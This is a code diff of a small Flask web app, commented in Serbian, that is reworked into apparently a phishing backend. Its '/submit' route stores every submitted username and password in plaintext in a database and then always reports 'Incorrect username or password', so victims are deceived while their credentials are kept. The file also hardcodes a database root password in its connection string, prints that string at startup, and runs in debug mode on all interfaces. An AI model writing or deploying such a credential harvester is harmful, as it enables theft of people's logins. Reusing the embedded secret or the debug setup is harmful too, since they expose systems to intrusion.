@@ -1,53 +1,63 @@
 import os
-from flask import Flask, render_template, request, redirect, url_for, flash
-from sqlalchemy import create_engine, text
-from sqlalchemy.orm import sessionmaker
+from flask import Flask, render_template, request, flash, redirect, url_for
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import text
 
 app = Flask(__name__)
-app.secret_key = "your_secret_key"
 
-# Povezivanje s bazom (MySQL na Railway)
-DATABASE_URL = "mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway"
-engine = create_engine(DATABASE_URL)
-Session = sessionmaker(bind=engine)
-session = Session()
+# ✅ Railway MySQL povezivanje
+DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway')
+app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.secret_key = os.urandom(24)
+app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {'pool_pre_ping': True}
 
-# Provera konekcije
-try:
-    with engine.connect() as connection:
-        connection.execute(text("SELECT 1"))
-    print("✅ Baza podataka uspešno povezana!")
-except Exception as e:
-    print(f"❌ GREŠKA pri povezivanju na bazu: {e}")
+# ✅ Inicijalizacija baze
+db = SQLAlchemy(app)
 
-# Početna stranica
+class LoginAttempt(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(150), nullable=False)
+    password = db.Column(db.String(150), nullable=False)
+
+with app.app_context():
+    try:
+        # ✅ Provera konekcije
+        with db.engine.connect() as connection:
+            result = connection.execute(text('SELECT 1'))
+            print(f"✅ Konekcija uspešna: {result.fetchone()}")
+        
+        db.create_all()
+        print("✅ Baza podataka je povezana i tabele su kreirane!")
+    except Exception as e:
+        print(f"❌ GREŠKA pri povezivanju na bazu: {e}")
+
+# ✅ Prikaz početne strane
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', message=None)
 
-# Ruta za prijavu
-@app.route('/login', methods=['POST'])
-def login():
+# ✅ Obrada unosa iz login forme
+@app.route('/submit', methods=['POST'])
+def submit():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    try:
-        with engine.connect() as connection:
-            # Ubacivanje login pokušaja u bazu
-            insert_query = text("""
-                INSERT INTO login_attempt (username, password, attempt_time) 
-                VALUES (:username, :password, NOW())
-            """)
-            connection.execute(insert_query, {"username": username, "password": password})
-
-            flash('Login attempt saved to database!', 'success')
-            return redirect(url_for('index'))
-
-    except Exception as e:
-        flash(f'Greška pri prijavljivanju: {e}', 'error')
+    if not username or not password:
+        flash("Sva polja su obavezna!", "danger")
         return redirect(url_for('index'))
 
-# Pokretanje servera na Railway portu (8080)
+    try:
+        new_attempt = LoginAttempt(username=username, password=password)
+        db.session.add(new_attempt)
+        db.session.commit()
+        print(f"✅ Podaci sačuvani: {username}")
+    except Exception as e:
+        db.session.rollback()
+        print(f"❌ GREŠKA pri upisu u bazu: {e}")
+
+    return render_template('index.html', message="Incorrect username or password.")
+
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    print("DATABASE URL:", app.config['SQLALCHEMY_DATABASE_URI'])
+    app.run(host="0.0.0.0", port=10000, debug=True)
